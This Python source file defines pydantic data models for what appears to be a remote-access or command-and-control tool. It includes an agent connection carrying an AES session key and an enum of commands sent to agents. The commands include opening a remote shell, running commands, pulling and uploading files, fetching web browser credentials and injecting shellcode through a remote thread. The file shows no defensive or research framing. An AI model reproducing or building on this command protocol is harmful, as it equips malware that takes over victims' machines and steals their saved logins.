from pydantic import BaseModel, Field, field_validator, BaseModel
from typing import Union
from enum import Enum, IntEnum
from uuid import UUID
from ..Utils.tools import hex_to_bytes, gen_xml

class AgentConnection(BaseModel):
    agent_id: Union[str, UUID] = Field(..., description="A valid UUID representing the agent's ID")
    key: Union[str, bytes] = Field(..., description="A valid Aes key for the session")


    @field_validator("agent_id")
    def validate_agent_id(cls, v):
        try:
            return UUID(v)
        except:
            raise ValueError ("agent_id is not a valide UUID")
        
    @field_validator("key")
    def validate_key(cls, v):
        if isinstance(v, str):
            return hex_to_bytes(v)
        return v
    


class CommandIdentifiers(IntEnum):
    START_SHELL_INSTANCE              = 1
    RUN_COMMAND                       = 2
    GET_BASIC_MACHINE_INFO            = 3
    SNAP_FULL_DIRECTORY               = 4
    GET_FILE_BASE_64                  = 5
    UPLOAD_FILE_BASE_64               = 6
    GET_WIFI_BAISIC_INFO              = 7
    FETCH_WEB_BROSER_CREDENTIALS      = 8
    ENUMERATE_PROCESSES               = 9
    SHELLCODE_INJECTION_REMOTE_THREAD = 10

    @property
    def desc(self):
        descriptions = {
            CommandIdentifiers.START_SHELL_INSTANCE: "Start a shell instance on client",
            CommandIdentifiers.RUN_COMMAND: "Execute a command on a running shell instance",
            CommandIdentifiers.GET_BASIC_MACHINE_INFO: "GET_BASIC_MACHINE_INFO",
            CommandIdentifiers.SNAP_FULL_DIRECTORY: "SNAP_FULL_DIRECTORY",
            CommandIdentifiers.GET_FILE_BASE_64: "GET_FILE_BASE_64",
            CommandIdentifiers.UPLOAD_FILE_BASE_64: "UPLOAD_FILE_BASE_64",
            CommandIdentifiers.GET_WIFI_BAISIC_INFO: "GET_WIFI_BAISIC_INFO",
            CommandIdentifiers.FETCH_WEB_BROSER_CREDENTIALS: "FETCH_WEB_BROSER_CREDENTIALS",
            CommandIdentifiers.ENUMERATE_PROCESSES: "ENUMERATE_PROCESSES",
            CommandIdentifiers.SHELLCODE_INJECTION_REMOTE_THREAD: "SHELLCODE_INJECTION_REMOTE_THREAD",
        }
        return descriptions.get(self, "")

class CommandIdentifiersName(str, Enum):
    pass
CommandIdentifiersName = Enum(
    "CommandIdentifiers", 
    {name: name for name in list(CommandIdentifiers.__members__.keys()) + ["UNKNOW"]}
)


class Command(BaseModel):

    action: int = Field(
        ...,
        title="Action",
        description="The identifier of the action to perform.",
        Literal=True
    )


    def model_dump(self, *args, **kwargs):
        base_dump = super().model_dump(*args, **kwargs)
        if isinstance(self.action, CommandIdentifiers):
            base_dump['action'] = self.action.value
        return base_dump
    
    def xml(self, *args, **kwargs):
        base_dump = super().model_dump(*args, **kwargs)
        if isinstance(self.action, CommandIdentifiers):
            base_dump['action'] = self.action.value
        return gen_xml(tag="root", **base_dump)
    
    class Config:  
        use_enum_values = True


class GenAction(Command):
    action: CommandIdentifiers = Field(..., Literal=False, description="Action to prform basen on CommandIdentifiers enum")

    class Config:
        extra = "allow"
        allow_extra_fildes = True